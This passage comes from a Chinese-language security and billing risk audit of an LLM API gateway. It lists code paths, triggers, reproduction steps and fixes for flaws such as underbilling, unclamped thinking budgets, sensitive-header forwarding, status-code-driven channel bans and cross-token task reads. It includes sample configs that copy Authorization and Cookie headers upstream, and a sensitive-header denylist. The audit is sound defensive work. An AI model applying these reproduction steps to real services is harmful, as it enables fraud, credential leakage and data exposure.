- 当前状态：已确认 hard delete 路径缺少缓存失效，尚未修复。

### 风险 150：responses compact 在模型映射后才重新计费，低价别名预扣不足时补扣失败只记录日志

- 标题：`/v1/responses/compact` 先按用户请求模型预扣，进入 handler 后 `ModelMappedHelper` 可把模型映射到另一个上游模型并改写 `OriginModelName`；成功响应后才重新计算 mapped compact 模型价格，若补扣失败不会回滚已成功的上游调用
- 影响范围：OpenAI responses compact、Codex/OpenAI compact 渠道、渠道 `model_mapping`、低价别名、按次/按 token 计费、订阅额度和钱包补扣
- 触发条件：渠道配置 `model_mapping` 把用户请求的低价模型或别名映射到更高价 compact 上游模型；用户余额或订阅额度足够通过预扣但不足以支付实际 mapped compact 价格；上游请求成功并返回 usage。
- 涉及文件/函数：
  - `middleware/distributor.go:393-395`：`/v1/responses/compact` 在分发阶段给请求模型追加 `-openai-compact` 后选渠和预扣
  - `controller/relay.go:153-165`：进入 relay handler 前按当时的 `OriginModelName` 调用 `ModelPriceHelper` 并预扣
  - `relay/helper/model_mapped.go:21-26`：compact 模式会先去掉 `-openai-compact` 后执行渠道 `model_mapping`
  - `relay/helper/model_mapped.go:69-76`：映射后再把 `OriginModelName` 改为 mapped upstream model 加 `-openai-compact`
  - `relay/responses_handler.go:142-157`：上游成功后才重新调用 `ModelPriceHelper`，随后 `PostTextConsumeQuota` 结算，再恢复原始 `OriginModelName/PriceData`
  - `service/text_quota.go:159-172`、`service/text_quota.go:227-300`：实际扣费从 `relayInfo.OriginModelName` 和 `relayInfo.PriceData` 生成 summary
  - `service/text_quota.go:427-429`：`SettleBilling` 失败只写日志，不会改变已返回给用户的成功响应
  - `service/billing.go:32-78`：结算差额发生在成功响应后的后置扣费路径
- 可能后果：用户请求低价 compact 别名时，系统可能只预扣低价别名额度；上游实际调用高价 mapped compact 模型成功后，补扣阶段如果钱包或订阅额度不足，只会记录错误日志，用户已经拿到成功结果。多次触发会形成“成功调用但未足额扣费”的运营亏损窗口，尤其在映射目标价格显著高于别名价格时更明显。
- 复现思路：配置一个 compact 渠道，将 `cheap-model` 映射到 `expensive-model`，并让 `cheap-model-openai-compact` 价格低于 `expensive-model-openai-compact`；给用户只保留足够预扣 cheap 的额度；调用 `/v1/responses/compact`，观察上游成功后 `SettleBilling` 是否因补扣不足记录错误，同时用户已收到成功响应。
- 修复建议：模型映射应在预扣和额度校验前完成，并明确“计费模型”字段；compact 分支不要在上游成功后才发现实际价格。若必须后结算，`SettleBilling` 补扣失败应进入欠费/冻结状态，记录待追缴流水，并阻止后续请求，不能只写日志。渠道配置保存时应提示 mapping 前后价格差异并要求管理员确认。
- 优先级：P1
- 当前状态：已确认 compact 映射后重新计费和补扣失败只记录日志的代码路径；尚未用本地构造价格和映射做端到端复现。

### 风险 151：Gemini `extra_body.google.thinking_config` 可覆盖本地 thinking 预算且不走 clamp，用户参数可能放大上游成本

- 标题：Gemini OpenAI 兼容转换中，只要请求携带 `extra_body.google.thinking_config`，就跳过默认 `ThinkingAdaptor`；用户提交的 `thinking_budget` 仅做类型转换，不调用 `clampThinkingBudget`，并会覆盖后缀模型计算出的预算
- 影响范围：Gemini/Vertex 渠道、OpenAI 兼容 chat 请求、Gemini 2.5 thinking budget、模型倍率、token 模型限制、渠道成本控制、用户自定义 `extra_body`
- 触发条件：`model_setting.gemini.thinking_adapter_enabled=true`；用户请求 Gemini/Vertex OpenAI 兼容接口并提交 `extra_body={"google":{"thinking_config":{"thinking_budget":...}}}`；运营依赖模型名后缀或默认配置控制 thinking budget；请求模型本地按普通模型或通配 thinking 模型计费。
- 涉及文件/函数：
  - `relay/channel/gemini/relay-gemini.go:134-198`：默认 `ThinkingAdaptor` 会按 `-thinking-<budget>`、`-thinking`、`reasoning_effort` 计算预算，并调用 `clampThinkingBudget`
  - `relay/channel/gemini/relay-gemini.go:241-318`：`extra_body.google.thinking_config` 解析后直接写入 `GenerationConfig.ThinkingConfig`
  - `relay/channel/gemini/relay-gemini.go:267-279`：`thinking_budget` 只从 float64 转 int，正数即 `IncludeThoughts=true`，没有范围上限
  - `relay/channel/gemini/relay-gemini.go:302-315`：如果已有 ThinkingConfig，用户提交的 `ThinkingBudget/IncludeThoughts/ThinkingLevel` 会覆盖或合并
  - `relay/channel/gemini/relay-gemini.go:355-357`：只要存在 `google` extra body，就不会再执行默认 `ThinkingAdaptor`
  - `relay/channel/gemini/adaptor.go:132-145`、`relay/channel/vertex/adaptor.go:173-185`：上游 URL 构造阶段会剥离 `-thinking/-nothinking/-low` 等后缀，实际请求打到基础模型
  - `relay/helper/price.go:67-120`、`service/text_quota.go:159-300`：本地预扣和后结算仍按 `OriginModelName/PriceData` 的模型倍率或固定价格计算，不包含用户传入的 thinking budget 数值
- 可能后果：用户可以在不改变模型名的情况下提高 Gemini thinking budget 或 thinking level，上游实际成本和延迟上升，但本地扣费仍只按模型名倍率和 token usage 结算；如果上游 usage 没有把 thinking budget 成本完整体现在返回 token 中，或本地 pricing 没有按 budget 区分倍率，就会形成高预算低扣费。即使上游拒绝超大预算，攻击者也可制造大量 400/重试/排障噪音。
- 复现思路：启用 Gemini thinking adapter，配置一个普通 Gemini 模型和 thinking 模型倍率；用相同模型分别请求默认配置、`extra_body.google.thinking_config.thinking_budget=1`、以及远高于 clamp 上限的 budget，观察发往上游的 `thinkingConfig`、本地 `logs.other`、扣费额度和错误率是否随 budget 正确变化。
- 修复建议：`extra_body.google.thinking_config` 必须复用 `clampThinkingBudget` 和 `clampThinkingBudgetByEffort`；普通用户可提交的 thinking budget 应受站点级上限、模型级上限和 token 级模型限制约束。计费应显式记录 `thinking_budget/thinking_level/include_thoughts`，并支持按 budget 档位或实际 reasoning tokens 加价。若运营不允许用户自定义，应提供开关禁用该 extra body 字段。
- 优先级：P1
- 当前状态：已确认用户 extra body 可绕过默认预算 clamp 并覆盖 ThinkingConfig；尚未通过真实 Gemini 上游验证成本差异。

### 风险 152：开启全局或渠道 pass-through 后会跳过 disabled fields 清理和转换防护，用户原始请求体可直达上游

- 标题：`PassThroughRequestEnabled` 或渠道 `PassThroughBodyEnabled` 开启后，chat、responses、Claude、Gemini、image、rerank 等 handler 直接使用原始 body；`RemoveDisabledFields` 也会提前返回，导致 `service_tier/speed/inference_geo/safety_identifier/store` 等防护字段不再被后端清理
- 影响范围：OpenAI 兼容 chat/responses、Claude Messages、Gemini、图片、rerank、AWS Bedrock pass-through、渠道成本控制、隐私字段控制、系统提示注入、字段黑名单策略
- 触发条件：站点开启全局请求体透传，或某个渠道启用 `PassThroughBodyEnabled`；普通用户向相关接口提交原始 JSON，携带正常转换链路会清理、改写或补充的字段；运营依赖 `ChannelOtherSettings` 禁止 service tier、speed、inference geo、safety identifier 或 store。
- 涉及文件/函数：
  - `relay/common/relay_info.go:785-859`：`RemoveDisabledFields` 负责清理 `service_tier/inference_geo/speed/store/safety_identifier/stream_options.include_obfuscation`，但一旦全局或渠道 pass-through 开启即直接返回原始 JSON
  - `relay/compatible_handler.go:73-108`：chat completions 在 pass-through 开启时跳过 `chatCompletionsViaResponses` 和 adaptor 转换，直接读取原始 body
  - `relay/compatible_handler.go:157-174`：非 pass-through 才会 marshal 转换后请求、清理 disabled fields 并应用 param override
  - `relay/responses_handler.go:73-103`：responses pass-through 路径直接使用原始 body，非 pass-through 才执行转换、字段清理和 param override
  - `relay/claude_handler.go:135-180`：Claude pass-through 跳过 chat-to-responses 转换、Claude adaptor 转换和 disabled fields 清理
  - `relay/gemini_handler.go:138-163`、`relay/image_handler.go:56-80`、`relay/rerank_handler.go:45-68`：多类 relay 在 pass-through 开启后都直接使用原始 body，跳过转换后的统一处理
  - `relay/channel/aws/relay-aws.go:173-190`：AWS pass-through 只删除 `model/stream`，其他用户字段会继续进入上游 payload
- 可能后果：普通用户可以在透传渠道上提交本应由后端清理或转换的高成本/敏感字段，例如 OpenAI service tier、Claude speed/inference geo、OpenAI safety identifier/store 等，造成额外上游成本、隐私字段外传、运营策略失效或日志与账单解释不一致。由于本地计费仍主要按 `OriginModelName/PriceData/usage` 结算，某些上游附加能力如果不体现在本地价格模型中，会出现“同模型低价调用高成本参数”的亏损窗口。
- 复现思路：配置一个 OpenAI/Claude 渠道并关闭 `AllowServiceTier/AllowSpeed/AllowInferenceGeo/AllowSafetyIdentifier`；先在非 pass-through 下提交包含这些字段的请求，确认 body 被清理；再开启渠道 `PassThroughBodyEnabled`，提交相同请求，观察发往上游的原始 body 是否保留字段。对 AWS Bedrock 可提交除 `model/stream` 外的 provider-specific 参数，确认仅这两个字段被删除。
- 修复建议：pass-through 不应绕过安全和成本字段清理；应把 `RemoveDisabledFields` 拆成“转换后清理”和“原始 body 清理”两层，即使透传也必须执行站点/渠道禁止字段过滤。对 pass-through 渠道增加显式高危确认、审计日志和字段 allowlist；价格模型应能记录并按 `service_tier/speed/inference_geo/reasoning/tool` 等附加参数加价或拒绝。
- 优先级：P1
- 当前状态：已确认 pass-through 分支会直接使用原始 body，且 `RemoveDisabledFields` 在 pass-through 开启时提前返回；尚未连接真实上游验证各 provider 字段产生的实际成本差异。

### 风险 153：param override 可从用户请求头复制敏感 header 到上游，绕过 header passthrough 的敏感头跳过列表

- 标题：header wildcard/regex passthrough 会跳过 `Authorization/x-api-key/cookie` 等敏感头，但 param override 的 `copy_header/pass_headers/sync_fields` 从 `RequestHeaders` 读取用户请求头时没有复用该跳过列表，可把用户鉴权或租户类 header 写入最终上游 header override
- 影响范围：渠道 `param_override`、`header_override`、上游请求头、OpenAI/Claude/Gemini 兼容请求、第三方代理租户隔离、用户 API key/会话 token/自定义安全 header
- 触发条件：管理员或模板配置了 `copy_header`、`pass_headers`、`sync_fields` 等 param override 操作，且源 header 名包含敏感信息，例如 `Authorization`、`X-Api-Key`、`Cookie`、业务租户 header 或内部审计 header；普通用户请求携带对应 header。
- 涉及文件/函数：
  - `relay/channel/api_request.go:67-94`、`relay/channel/api_request.go:135-145`：wildcard/regex header passthrough 明确跳过 hop-by-hop、cookie、authorization、x-api-key、x-goog-api-key 等敏感头
  - `relay/channel/api_request.go:180-288`：普通 header override 在 passthrough 后执行，显式 override 最终写入上游 header
  - `relay/channel/api_request.go:294-329`：header override 在 `SetupRequestHeader` 之后应用，可覆盖默认上游认证头
  - `relay/common/relay_info.go:516-535`：`cloneRequestHeaders` 会克隆用户请求头，未按敏感头列表过滤
  - `relay/common/override.go:1488-1505`、`relay/common/override.go:1511-1527`：param override 上下文会读取 `header_override` 和 `request_headers`
  - `relay/common/override.go:895-963`：`set_header/delete_header/copy_header/move_header/pass_headers/sync_fields` 可在请求体 override 阶段写入 runtime header override
  - `relay/common/override.go:1236-1358`、`relay/common/override.go:1366-1445`：`copy_header/pass_headers/sync_fields` 只做名称归一化和存在性判断，没有拒绝敏感 header
  - `relay/common/override_test.go:1324-1358`：测试显式覆盖了从 `Authorization` 请求头复制到 `X-Upstream-Auth` 后再参与条件判断的行为
  - `service/log_info_generate.go:299-304`：param override 审计仅在命中敏感路径或 debug 时记录到 `other.po`，并非所有 header 复制都会稳定留痕
- 可能后果：误配置或恶意模板可能把用户的 NewAPI token、浏览器 cookie、客户自定义密钥、内部租户标识透传给第三方上游，造成凭证泄露、上游多租户串账、审计归属错误或第三方服务按用户传入 header 执行额外能力。由于最终 override 在 adaptor 设置认证之后应用，显式写入 `Authorization/Host` 还可能覆盖渠道本来的上游认证或目标 host，造成请求失败、串渠道或异常计费。
- 复现思路：配置渠道 `param_override` 为 `{"operations":[{"mode":"copy_header","from":"Authorization","to":"X-Upstream-Auth"}]}` 或 `{"mode":"pass_headers","value":["Authorization","Cookie"]}`；使用普通 token 请求并携带对应 header；观察 `info.RuntimeHeadersOverride` 和最终上游请求头是否包含用户 header。再对比 `header_override={"*":""}` 的 wildcard passthrough，确认 wildcard 会跳过敏感头而 param override 不跳过。
- 修复建议：把 `shouldSkipPassthroughHeader` 或等价敏感头 denylist 下沉为公共函数，并在 param override 的 `copy_header/pass_headers/sync_fields(header:...)` 中复用；默认禁止复制 `Authorization/Cookie/X-Api-Key/X-Goog-Api-Key/Proxy-*` 等敏感头，确需透传时要求管理员显式 allowlist、二次确认和审计。`ParamOverrideAudit` 应对所有 header 读写操作稳定记录脱敏摘要，并在渠道测试中展示最终 header 影响。
- 优先级：P1
- 当前状态：已确认 wildcard/regex header passthrough 有敏感头跳过列表，但 param override 读写 request headers 不复用该列表；尚未做真实上游抓包验证。

### 风险 155：渠道 `status_code_mapping` 在自动禁用和重试判断前生效，可把普通用户错误放大为误封渠道或绕过重试/禁用

- 标题：handler 在返回错误前先调用 `ResetStatusCode` 改写 `NewAPIError.StatusCode`，随后 `processChannelError` 和 `shouldRetry` 都使用改写后的状态码；因此 `status_code_mapping` 不只是改客户端响应，还会改变自动禁用、重试和错误日志归因
- 影响范围：渠道 `status_code_mapping`、自动禁用 `auto_ban`、全局自动禁用状态码、自动重试状态码、用户失败退款、渠道可用性、错误日志、运营告警
- 触发条件：渠道配置了状态码映射，例如把 400/429/500 映射到 401，或把 401/429/500 映射到 200/400/504；普通用户发起可触发对应上游错误的请求；全局 `AutomaticDisableChannelEnabled`、渠道 `auto_ban` 或重试开关处于启用状态。
- 涉及文件/函数：
  - `relay/compatible_handler.go:203-207`、`relay/responses_handler.go:127-131`、`relay/claude_handler.go:205-209`：上游非 200 响应经 `RelayErrorHandler` 后立即执行 `ResetStatusCode`
  - `relay/gemini_handler.go`、`relay/embedding_handler.go`、`relay/image_handler.go`、`relay/audio_handler.go`、`relay/rerank_handler.go`、`relay/chat_completions_via_responses.go`：多类 relay 都在 handler 内做相同状态码重置
  - `service/error.go:133-155`：`ResetStatusCode` 只跳过原始 200，未限制目标状态码范围，也未标记“原始状态码”和“映射后状态码”
  - `service/error.go:158-184`、`service/error_test.go:18-64`：目标值支持 string/int/float/json.Number；测试只覆盖 429→503 和无效字符串，不覆盖 2xx、越界或运营语义
  - `controller/relay.go:223-235`：handler 返回错误后才调用 `processChannelError` 和 `shouldRetry`
  - `controller/relay.go:324-353`：重试判断使用改写后的 `openaiErr.StatusCode`，2xx 直接不重试，自动重试区间也按改写后状态码匹配
  - `controller/relay.go:356-398`：错误日志和自动禁用处理使用改写后的状态码
  - `service/channel.go:45-64`：`ShouldDisableChannel` 按改写后的状态码匹配 `AutomaticDisableStatusCodeRanges`，默认 401 会禁用渠道
  - `setting/operation_setting/status_code_ranges.go:17-29`、`setting/operation_setting/status_code_ranges.go:80-84`：默认自动禁用 401，默认重试覆盖大量 4xx/5xx
  - `web/default/src/features/channels/lib/status-code-risk-guard.ts:19-90`：前端只校验 100-599 格式，并只把 504/524 的改写视为需要确认的风险
  - `controller/option.go:280-296`：全局自动禁用/重试状态码有后端范围解析；但渠道 `status_code_mapping` 保存路径没有等价运营语义校验
- 可能后果：如果运营把某个用户可触发的 400 映射成 401，普通用户提交无效参数就可能触发 `auto_ban`，把健康渠道自动禁用，造成服务不可用。反过来，如果把真实 401/429/500 映射成 200、400、504 或其他不重试/不禁用状态，系统会跳过重试和自动禁用，用户请求失败后退款，但运营无法及时隔离坏 key/坏渠道。错误日志也只记录映射后状态码，削弱排障和对账能力。
- 复现思路：配置测试渠道 `status_code_mapping={"400":401}` 且 `auto_ban=1`，构造一个会让上游返回 400 的普通用户请求，观察 `processChannelError` 是否按 401 触发自动禁用。再配置 `{"401":400}` 或 `{"500":200}`，触发对应上游错误，观察是否不再自动禁用/重试，并确认错误日志 `other.status_code` 是否只保留映射后状态。
- 修复建议：状态码映射应只作用于最终客户端响应，不应覆盖内部 `NewAPIError` 用于重试、禁用和日志归因的原始状态码；至少需要在错误对象中同时保存 `upstream_status_code`、`mapped_status_code`，自动禁用和重试默认使用原始状态码。后端保存 `status_code_mapping` 时应校验 from/to 都在 100-599，禁止映射到 2xx，禁止把用户可触发 4xx 映射为自动禁用码，或要求独立高危确认并写入审计。
- 优先级：P1
- 当前状态：已确认状态码映射在自动禁用/重试前执行，且后续逻辑使用改写后的状态码；尚未构造本地假上游做端到端误封复现。

### 风险 156：视频/异步任务结果按用户而非提交 token 隔离，同一用户下任意 token 可读取其他 token 的任务结果

- 标题：任务提交时已把提交 token 写入 `TaskPrivateData.TokenId`，但任务列表、任务详情、Suno 批量 fetch 和视频内容代理都只校验 `user_id + task_id`，没有要求当前 token 与提交 token 匹配
- 影响范围：OpenAI Video API、Suno 任务查询、通用任务列表、视频内容下载、企业子 key 隔离、代理分销、客户级任务隐私、token 审计归因
- 触发条件：同一用户下存在多个 API token，且不同 token 分配给不同业务方、客户、项目或自动化任务；其中一个 token 知道或获得另一个 token 创建的 `task_id`，或使用账号会话查看 `/api/task/self`；任务已成功或处于可查询状态。
- 涉及文件/函数：
  - `middleware/auth.go:194-207`：`TokenOrUserAuth` 对视频内容代理允许 session 或 token，通过 token 认证时只设置用户 id 和 token id，不做任务作用域校验
  - `router/video-router.go:10-17`：`/v1/videos/:task_id/content` 使用 `TokenOrUserAuth`
  - `router/video-router.go:19-32`、`router/relay-router.go:192-199`：视频详情和 Suno fetch 使用 `TokenAuth` 后进入 `RelayTaskFetch`
  - `relay/common/relay_info.go:463-477`、`controller/relay.go:579-584`：任务提交时从上下文保存 `relayInfo.TokenId` 到 `task.PrivateData.TokenId`
  - `model/task.go:99-107`：`TaskPrivateData` 已有 `TokenId` 字段，说明系统具备记录提交 token 的能力
  - `model/task.go:211-244`、`model/task.go:484-508`：普通用户任务列表和数量只按 `user_id` 过滤，不按 token 过滤
  - `model/task.go:331-358`：`GetByTaskId` 和 `GetByTaskIds` 只按 `user_id` 与 `task_id` 查询
  - `relay/relay_task.go:310-358`：Suno 批量/单条 fetch 使用 `GetByTaskIds/GetByTaskId(userId, ...)`
  - `relay/relay_task.go:362-415`：视频任务详情使用 `GetByTaskId(userId, taskId)`
  - `controller/video_proxy.go:33-56`：视频内容下载只检查 `model.GetByTaskId(userID, taskID)` 和任务成功状态
  - `controller/task.go:45-66`：`/api/task/self` 展示当前用户全部任务，没有 token 维度筛选
- 可能后果：运营或企业用户常把不同 token 分给不同客户、项目、员工或下游代理，并依赖 token 额度作为隔离边界。当前实现下，一个同用户下的 token 只要获得任务 id，就可以查询或下载其他 token 创建的视频/异步任务结果；账号会话也可以看到所有 token 的任务列表。对生成视频、图像、音频或客户素材任务，这会造成租户内数据串读、隐私泄露和审计归因错误。若某个低权限 token 泄露，攻击者可读取同用户下高价值任务结果，而不仅是消耗该 token 额度。
- 复现思路：为同一用户创建 token A 和 token B；用 token A 提交视频或 Suno 任务并得到 `task_id`；用 token B 调用 `GET /v1/videos/:task_id`、`GET /v1/videos/:task_id/content` 或 Suno fetch，观察只要用户 id 一致即可返回任务详情或内容。再用普通用户会话访问 `/api/task/self`，确认列表包含 A/B 两个 token 的任务且没有 token 隔离标识。
- 修复建议：任务查询和结果下载应引入作用域判断：token 认证时默认要求 `task.PrivateData.TokenId == 当前 token_id`，账号 session 可按产品语义查看全部或按项目筛选；如需共享，应有显式 project/workspace scope。`/api/task/self` 增加 token/project 过滤和返回字段审计，管理员视图保留全量但记录访问日志。迁移旧任务时没有 token id 的记录可按兼容策略仅允许账号 session 或原有用户级访问，并在响应中标记 legacy visibility。
- 优先级：P1
- 当前状态：已确认提交路径保存 token id，但查询、列表和视频代理路径没有使用该字段做访问控制；尚未编写端到端测试。

### 风险 157：任务详情和用户任务列表直接返回上游结果 URL，可能长期暴露签名链接、临时下载地址或 provider 文件地址

- 标题：`TaskModel2Dto` 把 `task.GetResultURL()` 作为 `result_url` 返回，实时 fetch 和 OpenAI video converter 也把 URL 放进响应 `url/metadata.url`；轮询成功时会把多个上游的直接 URL 保存到 `PrivateData.ResultURL`
- 影响范围：视频/异步任务结果、上游临时签名 URL、provider 文件下载地址、用户任务列表、OpenAI video metadata、客服/前端日志、数据库长期留存
- 触发条件：上游返回直接下载 URL、临时签名 URL、带文件 id 的下载地址或可外部访问的 CDN 链接；后台轮询或实时查询把它保存到任务；普通用户调用 `/api/task/self`、任务 fetch 或 `/v1/videos/:task_id` 获取任务详情。
- 涉及文件/函数：
  - `model/task.go:99-107`：`PrivateData.ResultURL` 被定义为任务成功后的结果 URL，本意是内部私有数据
  - `model/task.go:129-136`：`GetResultURL` 优先返回 `PrivateData.ResultURL`，旧数据回退到 `FailReason`
  - `service/task_polling.go:437-450`：视频轮询成功时，非 `data:` 的 `taskResult.Url` 会直接写入 `task.PrivateData.ResultURL`；没有统一改写成本地代理 URL
  - `relay/relay_task.go:467-474`：用户实时 fetch Gemini/Vertex 时也可能把 `ti.Url` 写入 `PrivateData.ResultURL`
  - `relay/relay_task.go:485-499`：非 OpenAI Video API 的实时 fetch 响应直接返回 `"url": task.GetResultURL()`
  - `relay/relay_task.go:541-563`：`TaskModel2Dto` 直接把 `task.GetResultURL()` 放入 `TaskDto.ResultURL`
  - `dto/task.go:32-53`：`TaskDto` 对外 JSON 包含 `result_url`
  - `controller/task.go:45-66`：普通用户 `/api/task/self` 返回 `tasksToDto(items, false)`，即返回 `result_url`
  - `model/task.go:509-518`：`ToOpenAIVideo` 把 `t.GetResultURL()` 放入 `metadata.url`
  - `relay/channel/task/kling/adaptor.go`、`doubao/adaptor.go`、`vidu/adaptor.go`、`ali/adaptor.go`、`jimeng/adaptor.go`、`hailuo/adaptor.go`：多个 adaptor 的 `ParseTaskResult` 或 `ConvertToOpenAIVideo` 使用上游返回的视频 URL
  - `relay/channel/task/taskcommon/helpers.go:63-67`：系统已有 `BuildProxyURL(taskID)`，但只有 `data:` 或无 URL 场景会回落到本地代理 URL
- 可能后果：本地视频代理会在下载前做 SSRF 校验、鉴权和统一响应，但任务详情接口直接把原始上游 URL 发给用户，绕过了本地代理的访问控制、过期策略、下载审计和脱敏策略。若 URL 是短期签名链接，会被前端、浏览器历史、客服截图、日志平台或第三方客户端长期保存；若 provider URL 内含文件 id、签名参数或可推断路径，泄露后可被绕过 NewAPI 直接下载或分享，平台失去访问审计和撤销能力。对企业客户，任务列表接口还会集中暴露历史结果 URL，扩大批量泄露面。
- 复现思路：选择 Kling、Ali、Doubao、Vidu、Jimeng 或 Hailuo 等返回直接视频 URL 的测试渠道，提交成功任务后调用 `/api/task/self`、Suno/通用 fetch 或 `/v1/videos/:task_id`；观察响应的 `result_url`、`url` 或 `metadata.url` 是否为 provider 原始下载地址，而不是 `/v1/videos/{task_id}/content` 本地代理地址。再检查数据库 `tasks.private_data` 是否长期保存该 URL。
- 修复建议：对普通用户响应默认只返回本地代理 URL，例如 `BuildProxyURL(task.TaskID)`，不要返回原始 provider URL；原始 URL 仅存内部字段并加密或设置保留期。OpenAI video metadata 中的 `url` 也应统一为本地 content endpoint，下载端继续做任务归属、过期、SSRF 和大小限制。管理员需要排障时通过高权限脱敏视图查看域名、过期时间和哈希，不展示完整签名参数。对旧 `FailReason` 兼容回退也要区分失败原因和结果 URL，避免失败文案被当成 URL 返回。
- 优先级：P1
- 当前状态：已确认多个查询/DTO 路径会返回 `GetResultURL()`，且轮询会保存直接上游 URL；尚未复现具体 provider 的签名 URL 泄露样例。

### 风险 159：多类视频任务的时长、分辨率和高价 metadata 字段可直达上游，但本地计费只按基础模型或少量字段预扣

- 标题：任务预扣依赖 adaptor 的 `EstimateBilling/AdjustBilling*` 返回倍率；Kling、Vidu、Hailuo 等视频 adaptor 继承 `BaseBilling`，不会按 `duration/resolution` 调整计费；Doubao 只识别 `video_url` 输入折扣，未覆盖 `service_tier/generate_audio/tools/return_last_frame/resolution/duration` 等可能影响上游成本的字段
- 影响范围：Kling、Vidu、Hailuo、Doubao 视频任务，用户钱包/订阅/token 预扣，渠道成本统计，模型倍率配置，任务消费日志，代理分销利润
- 触发条件：普通用户提交视频任务时传入更长时长、更高分辨率、音频生成、工具调用、快速/高优先级 service tier、返回首尾帧或其他 provider 高价字段；命中对应渠道后上游按这些参数加价或消耗更多资源，但本地没有对应倍率或差额结算。
- 涉及文件/函数：
  - `relay/channel/adapter.go:41-61`：任务计费扩展点由 `EstimateBilling`、`AdjustBillingOnSubmit`、`AdjustBillingOnComplete` 提供
  - `relay/relay_task.go:180-203`：提交前只把 `EstimateBilling` 返回的 `OtherRatios` 乘到预扣额度
  - `relay/relay_task.go:243-250`：提交后只有 adaptor 返回 `AdjustBillingOnSubmit` 时才改写最终 quota
  - `service/task_polling.go:538-560`：完成后只有 `AdjustBillingOnComplete` 或 `TotalTokens` 才会差额结算，否则保持预扣额度
  - `relay/channel/task/taskcommon/helpers.go:82-97`：`BaseBilling` 的三个计费扩展点都返回空/0，表示不调整
  - `relay/channel/task/kling/adaptor.go:60-74`：Kling 请求结构含 `duration`、`mode`、`cfg_scale`、`camera_control`、`callback_url`、`external_task_id` 等字段
  - `relay/channel/task/kling/adaptor.go:266-289`：Kling 会用 `req.Duration` 和 metadata 构建上游请求，但 `TaskAdaptor` 继承 `BaseBilling`
  - `relay/channel/task/vidu/adaptor.go:30-40`、`relay/channel/task/vidu/adaptor.go:75-79`、`relay/channel/task/vidu/adaptor.go:227-240`：Vidu 请求含 `duration/resolution/bgm/payload/callback_url`，metadata 可覆盖，且继承 `BaseBilling`
  - `relay/channel/task/hailuo/models.go:8-18`、`relay/channel/task/hailuo/adaptor.go:25-31`、`relay/channel/task/hailuo/adaptor.go:145-166`：Hailuo 请求含 `duration/resolution/fast_pretreatment/aigc_watermark/first_frame_image/last_frame_image`，且继承 `BaseBilling`
  - `relay/channel/task/doubao/adaptor.go:43-62`：Doubao 请求含 `return_last_frame/service_tier/execution_expires_after/generate_audio/draft/tools/resolution/ratio/duration/frames/watermark`
  - `relay/channel/task/doubao/adaptor.go:135-147`：Doubao `EstimateBilling` 只检测 `metadata.content` 中是否有 `video_url`，只返回 `video_input` 折扣
  - `relay/channel/task/doubao/adaptor.go:303-335`：Doubao 轮询会解析 `TotalTokens`，但高价 video 参数如果不体现在 token 或模型倍率中，就不会按参数补差
  - `relay/channel/task/gemini/adaptor.go:160-177`、`relay/channel/task/vertex/adaptor.go:124-138`、`relay/channel/task/ali/adaptor.go:346-365`：对比证据，Gemini/Vertex/Ali 已显式把时长和分辨率纳入 `OtherRatios`
- 可能后果：用户可以用基础价格提交更贵的任务形态，例如更长视频、更高分辨率、带音频、工具增强、优先服务层或返回额外素材；平台向上游支付高成本，但本地只按基础模型或部分折扣扣费，导致渠道利润被吃掉、订阅池被低估、token 限额失真和用户账单解释困难。因为任务完成后默认保持预扣额度，除非 provider 返回可用 `TotalTokens` 且本地模型倍率是 token 计费，否则后续轮询不会自动补扣差额。
- 复现思路：选择继承 `BaseBilling` 的 Kling/Vidu/Hailuo 测试渠道，分别用相同模型提交默认时长/分辨率和高时长/高分辨率任务，对比 `X-New-Api-Other-Ratios`、`tasks.quota` 和消费日志，确认本地扣费是否相同。对 Doubao 提交带 `metadata={"generate_audio":true,"service_tier":"fast","return_last_frame":true,"duration":10,"resolution":"1080p","tools":[{"type":"web_search"}]}` 的任务，抓取上游请求确认字段被透传，再对比本地 `OtherRatios` 是否仍只包含 `video_input` 或为空。
- 修复建议：为任务 metadata 建立 provider 级 allowlist 和 pricing schema，所有会影响上游价格的字段必须先进入 `EstimateBilling`，否则拒绝请求。Kling/Vidu/Hailuo 至少要按 duration、resolution、mode/quality、音频/水印/参考图数量等配置倍率；Doubao 应覆盖 `duration/resolution/generate_audio/service_tier/tools/return_last_frame/frames` 等字段，并在 `AdjustBillingOnComplete` 中用上游最终响应校验实际参数。`TaskBillingContext.OtherRatios` 应保存每个成本字段的来源和原始值，日志中展示便于对账。
- 优先级：P1
- 当前状态：已确认多类 adaptor 继承 `BaseBilling` 或只实现部分计费估算，且对应请求结构允许用户参数/metadata 影响上游请求；尚未用真实 provider 账单核对具体价差。

### 风险 160：异步任务完成后按当前模型/分组倍率重算，不使用提交时的 `BillingContext` 价格快照

- 标题：任务提交时已经保存 `ModelPrice/ModelRatio/GroupRatio/OtherRatios` 快照，但 `RecalculateTaskQuotaByTokens` 只复用 `OtherRatios`，模型倍率和分组倍率重新读取当前配置；待完成任务会被后续价格调整、分组倍率调整或 special group ratio 调整回溯影响
- 影响范围：Gemini/Vertex/Doubao 等会在完成后返回 `TotalTokens` 的异步任务，钱包余额、订阅额度、token 额度、任务差额补扣/退款、模型价格调整、分组倍率调整、运营对账
- 触发条件：异步任务提交后尚未完成；管理员修改 `ModelRatio`、`GroupRatio` 或 `GroupGroupRatio`；用户组/分组配置变化；随后任务成功并返回 `TotalTokens`，触发 `RecalculateTaskQuotaByTokens`。
- 涉及文件/函数：
  - `controller/relay.go:579-590`：任务落库前把 `relayInfo.PriceData.ModelPrice`、`GroupRatioInfo.GroupRatio`、`ModelRatio`、`OtherRatios`、`OriginModelName` 保存到 `task.PrivateData.BillingContext`
  - `model/task.go:110-118`：`TaskBillingContext` 注释说明该结构用于轮询阶段重新计算额度，字段包含提交时的模型价格、分组倍率和模型倍率
  - `service/task_billing.go:119-139`：日志 `taskBillingOther` 会从 `BillingContext` 输出旧的 `model_price/model_ratio/group_ratio/other_ratios`
  - `service/task_billing.go:142-147`：任务模型名优先取 `BillingContext.OriginModelName`
  - `service/task_billing.go:247-300`：`RecalculateTaskQuotaByTokens` 重新调用 `ratio_setting.GetModelRatio(modelName)`、`ratio_setting.GetGroupRatio(group)`、`ratio_setting.GetGroupGroupRatio(group, group)`，只从 `BillingContext` 读取 `OtherRatios`
  - `service/task_polling.go:538-560`：任务完成后如果 `taskResult.TotalTokens > 0`，会调用上述 token 重算路径
  - `model/option.go:536-541`、`controller/option.go:226-270`：后台可更新 `ModelRatio`、`GroupRatio`、`GroupGroupRatio`
